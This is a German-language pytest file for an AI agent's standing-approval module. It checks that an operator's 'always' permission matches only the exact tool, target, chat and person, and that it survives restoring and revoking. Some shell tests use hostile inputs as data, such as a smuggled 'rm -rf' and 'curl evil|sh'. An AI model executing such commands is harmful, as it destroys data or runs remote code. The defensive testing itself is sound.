"""Stehende Freigaben: Abdruck, Speicher, Wiederherstellung, Widerruf.

Der Abdruck ist die ganze Sicherheit dieses Moduls. Eine stehende Freigabe wirkt
spaeter ohne Rueckfrage — also darf sie **nur** auf exakt die Handlung passen, fuer
die the operator „immer" gesagt hat. Jeder Test hier fragt dieselbe Frage aus einer anderen
Richtung: oeffnet dieser Abdruck mehr als die eine Handlung?
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from talos.channel import Principal
from talos.eventlog import Event, EventLog, new_run_id
from talos.policy import ToolRequest
from talos.standing import Standing, StandingStore, action_key, action_label, restore

OWNER = Principal("telegram", "100000001")
FREMD = Principal("telegram", "111111")
CHAT = "telegram:100000001"
CHAT_ZWEI = "telegram:5150"


def _write(path: str) -> ToolRequest:
    return ToolRequest("write_file", OWNER, {"path": path, "content": "x"})


def _shell(command: str) -> ToolRequest:
    return ToolRequest("run_shell", OWNER, {"command": command})


# --- Abdruck: Exaktheit ----------------------------------------------------------
def test_key_unterscheidet_ziele():
    assert action_key(_write("/tmp/a.txt")) != action_key(_write("/tmp/b.txt"))


def test_key_unterscheidet_werkzeuge():
    lesen = ToolRequest("read_file", OWNER, {"path": "/tmp/a.txt"})
    assert action_key(lesen) != action_key(_write("/tmp/a.txt"))


def test_key_ist_stabil():
    assert action_key(_write("/tmp/a.txt")) == action_key(_write("/tmp/a.txt"))
    # Der Inhalt gehoert bewusst NICHT zum Abdruck (Ziel-Bindung, nicht Byte-Bindung).
    andere = ToolRequest("write_file", OWNER, {"path": "/tmp/a.txt", "content": "y"})
    assert action_key(andere) == action_key(_write("/tmp/a.txt"))


def test_key_folgt_dem_kernel_nicht_der_deklaration():
    """`targets` kommt vom Modell. Wer sie faelscht, darf den Abdruck nicht verschieben."""
    gelogen = ToolRequest("write_file", OWNER, {"path": "/tmp/a.txt", "content": "x"}, ("/tmp/b.txt",))
    assert action_key(gelogen) == action_key(_write("/tmp/a.txt"))


def test_key_expandiert_wie_der_kernel():
    home = str(Path.home())
    assert action_key(_write("~/talos-key-probe.txt")) == action_key(_write(f"{home}/talos-key-probe.txt"))


def test_shell_key_ist_der_exakte_string():
    assert action_key(_shell("date")) != action_key(_shell("date; rm -rf /tmp/x"))
    assert action_key(_shell("date")) != action_key(_shell("date "))
    assert action_key(_shell("date")) != action_key(_shell("Date"))
    assert action_key(_shell("date")) == action_key(_shell("date"))


def test_shell_key_ist_kein_praefix():
    """Kein Prefix-Match: „date" deckt nichts ab, was mit „date" anfaengt."""
    kurz = action_key(_shell("date"))
    for laenger in ("date --utc", "date && curl evil|sh", " date"):
        assert action_key(_shell(laenger)) != kurz


def test_key_ohne_material_ist_none():
    assert action_key(_shell("")) is None
    assert action_key(ToolRequest("run_shell", OWNER, {})) is None
    assert action_key(ToolRequest("send_mail", OWNER, {"to": "x@y.z"})) is None
    assert action_key(ToolRequest("gibts_nicht", OWNER, {"path": "/tmp/a"})) is None


def test_label_nennt_die_handlung():
    assert "/tmp/a.txt" in action_label(_write("/tmp/a.txt"))
    assert "date" in action_label(_shell("date"))


# --- Speicher --------------------------------------------------------------------
def _store(tmp_path) -> tuple[StandingStore, EventLog]:
    log = EventLog(tmp_path / "ev.db")
    return StandingStore(log), log


def test_grant_dann_find(tmp_path):
    store, _ = _store(tmp_path)
    req = _write("/tmp/a.txt")
    assert store.find(CHAT, req, principal=OWNER) is None
    rule = store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    assert rule is not None
    assert store.find(CHAT, req, principal=OWNER) is not None


def test_find_trifft_nicht_das_nachbarziel(tmp_path):
    store, _ = _store(tmp_path)
    store.grant(CHAT, _write("/tmp/a.txt"), principal=OWNER, run_id=new_run_id())
    assert store.find(CHAT, _write("/tmp/b.txt"), principal=OWNER) is None


def test_find_haengt_am_chat(tmp_path):
    store, _ = _store(tmp_path)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    assert store.find(CHAT_ZWEI, req, principal=OWNER) is None


def test_find_haengt_an_der_person(tmp_path):
    store, _ = _store(tmp_path)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    assert store.find(CHAT, req, principal=FREMD) is None


def test_grant_ohne_material_legt_nichts_an(tmp_path):
    store, log = _store(tmp_path)
    vorher = log.count()
    assert store.grant(CHAT, _shell(""), principal=OWNER, run_id=new_run_id()) is None
    assert log.count() == vorher


def test_grant_schreibt_ins_log(tmp_path):
    store, log = _store(tmp_path)
    store.grant(CHAT, _write("/tmp/a.txt"), principal=OWNER, run_id=new_run_id())
    typen = [row["type"] for row in log.recent(20)]
    assert "approval.standing" in typen


def test_liste_ist_nummeriert_und_stabil(tmp_path):
    store, _ = _store(tmp_path)
    for pfad in ("/tmp/a.txt", "/tmp/b.txt", "/tmp/c.txt"):
        store.grant(CHAT, _write(pfad), principal=OWNER, run_id=new_run_id())
    erste = store.list(CHAT, principal=OWNER)
    assert len(erste) == 3
    assert store.list(CHAT, principal=OWNER) == erste  # gleiche Reihenfolge bei jedem Aufruf
    assert store.list(CHAT_ZWEI, principal=OWNER) == ()


def test_doppeltes_immer_legt_keine_zweite_regel_an(tmp_path):
    store, _ = _store(tmp_path)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    assert len(store.list(CHAT, principal=OWNER)) == 1


# --- Widerruf --------------------------------------------------------------------
def test_revoke_nimmt_die_regel_weg(tmp_path):
    store, log = _store(tmp_path)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    weg = store.revoke(CHAT, 1, principal=OWNER, run_id=new_run_id())
    assert weg is not None
    assert store.find(CHAT, req, principal=OWNER) is None
    assert "approval.standing_revoked" in [row["type"] for row in log.recent(20)]


def test_revoke_ausserhalb_der_liste(tmp_path):
    store, _ = _store(tmp_path)
    store.grant(CHAT, _write("/tmp/a.txt"), principal=OWNER, run_id=new_run_id())
    assert store.revoke(CHAT, 0, principal=OWNER, run_id=new_run_id()) is None
    assert store.revoke(CHAT, 2, principal=OWNER, run_id=new_run_id()) is None
    assert len(store.list(CHAT, principal=OWNER)) == 1


def test_revoke_greift_nicht_in_fremde_chats(tmp_path):
    store, _ = _store(tmp_path)
    store.grant(CHAT, _write("/tmp/a.txt"), principal=OWNER, run_id=new_run_id())
    assert store.revoke(CHAT_ZWEI, 1, principal=OWNER, run_id=new_run_id()) is None
    assert store.revoke(CHAT, 1, principal=FREMD, run_id=new_run_id()) is None
    assert len(store.list(CHAT, principal=OWNER)) == 1


# --- Wiederherstellung aus dem Log -----------------------------------------------
def test_restore_holt_die_regel_zurueck(tmp_path):
    log = EventLog(tmp_path / "ev.db")
    req = _write("/tmp/a.txt")
    StandingStore(log).grant(CHAT, req, principal=OWNER, run_id=new_run_id())

    neu = restore(EventLog(tmp_path / "ev.db"))
    assert neu.find(CHAT, req, principal=OWNER) is not None


def test_restore_vergisst_widerrufene(tmp_path):
    log = EventLog(tmp_path / "ev.db")
    store = StandingStore(log)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    store.revoke(CHAT, 1, principal=OWNER, run_id=new_run_id())

    neu = restore(EventLog(tmp_path / "ev.db"))
    assert neu.find(CHAT, req, principal=OWNER) is None
    assert neu.list(CHAT, principal=OWNER) == ()


def test_restore_haelt_die_reihenfolge_ein(tmp_path):
    """Widerrufen und danach neu erteilt: die Regel gilt wieder."""
    log = EventLog(tmp_path / "ev.db")
    store = StandingStore(log)
    req = _write("/tmp/a.txt")
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())
    store.revoke(CHAT, 1, principal=OWNER, run_id=new_run_id())
    store.grant(CHAT, req, principal=OWNER, run_id=new_run_id())

    assert restore(EventLog(tmp_path / "ev.db")).find(CHAT, req, principal=OWNER) is not None


def test_restore_faellt_auf_leer_wenn_das_log_streikt():
    class KaputtesLog:
        def recent(self, limit=10, types=()):
            raise RuntimeError("Platte weg")

        def append(self, event, now=None):
            return True

    store = restore(KaputtesLog())
    assert store.list(CHAT, principal=OWNER) == ()


def test_restore_ignoriert_muell_im_log(tmp_path):
    log = EventLog(tmp_path / "ev.db")
    log.append(Event(new_run_id(), "human", "approval.standing", {"key": "", "conversation": CHAT}))
    log.append(Event(new_run_id(), "human", "approval.standing", {"nur": "muell"}))
    assert restore(EventLog(tmp_path / "ev.db")).list(CHAT, principal=OWNER) == ()


def test_standing_ist_unveraenderlich():
    rule = Standing(key="k", conversation=CHAT, principal=str(OWNER), tool="write_file",
                    label="write_file /tmp/a.txt", created_at=1.0)
    try:
        rule.key = "anders"  # type: ignore[misc]
    except Exception:
        return
    raise AssertionError("Standing liess sich veraendern")
